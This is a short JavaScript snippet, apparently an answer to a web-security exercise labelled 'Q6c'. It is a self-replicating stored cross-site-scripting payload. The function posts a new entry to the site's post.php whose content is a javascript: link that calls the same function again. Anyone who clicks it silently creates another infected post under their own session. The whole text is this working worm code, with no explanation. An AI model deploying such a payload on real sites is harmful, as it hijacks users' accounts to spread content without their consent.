function myfunc() {
    const formData = new FormData();
    formData.append("title","Q6c");
    formData.append("content","<a href=\"javascript:myfunc();\">Q6c_createpost</a>");
    formData.append("type",1);
    formData.append("form","content");
    fetch(window.location.pathname+"/../post.php", {
        method: "POST",
        body: formData,
    });
}